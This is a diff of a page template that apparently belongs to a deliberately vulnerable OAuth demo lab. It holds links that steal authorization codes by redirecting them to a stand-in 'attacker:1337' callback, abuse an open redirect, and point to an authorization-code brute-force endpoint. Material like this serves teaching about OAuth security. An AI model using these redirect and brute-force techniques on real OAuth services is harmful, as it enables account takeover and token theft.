@@ -7,9 +7,13 @@ block content
     ul
       li 
         | Steal authorization code: Please click 
-        | <a href="http://gallery:3005/oauth/authorize?response_type=code&redirect_uri=http%3A%2F%2Fattacker%3A1337%2Fcallback&scope=email&client_id=photoprint">here</a>
+        | <a href="http://gallery:3005/oauth/authorize?response_type=code&redirect_uri=http%3A%2F%2Fattacker%3A1337%2Fcallback&scope=view_gallery&client_id=photoprint">here</a>
         | .
       li 
         | Open redirect to synopsys.com if clients are auto-approved: Please click 
-        | <a href="http://gallery:3005/oauth/authorize?response_type=code&redirect_uri=http%3A%2F%2Fwww.synopsys.com&scope=email&client_id=photoprint">here</a>
+        | <a href="http://gallery:3005/oauth/authorize?response_type=code&redirect_uri=http%3A%2F%2Fwww.synopsys.com&scope=view_gallery&client_id=photoprint">here</a>
         | .
+    h3 Weak Authorization Codes
+    p 
+      | Bruteforce authorization codes 
+      | <a href="http://attacker:1337/guessauthzcode">here</a>.
